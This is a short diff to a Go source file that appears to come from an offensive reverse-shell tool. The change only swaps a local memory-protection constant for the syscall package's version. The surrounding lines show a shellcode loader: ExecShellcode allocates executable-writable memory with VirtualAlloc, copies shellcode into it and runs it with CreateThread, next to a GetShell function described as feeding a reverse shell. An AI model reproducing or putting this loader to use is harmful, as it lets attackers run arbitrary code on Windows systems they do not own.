@@ -11,9 +11,8 @@ import (
 )
 
 const (
-	MEM_COMMIT             = 0x1000
-	MEM_RESERVE            = 0x2000
-	PAGE_EXECUTE_READWRITE = 0x40
+	MEM_COMMIT  = 0x1000
+	MEM_RESERVE = 0x2000
 )
 
 // GetShell pops an *exec.Cmd and return it to be used in a reverse shell
@@ -53,7 +52,7 @@ func ExecShellcode(shellcode []byte) {
 	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
 	procCreateThread := kernel32.MustFindProc("CreateThread")
 	// Reserve space to drop shellcode
-	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, syscall.PAGE_EXECUTE_READWRITE)
 	// Ugly, but works
 	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
 	// Copy shellcode
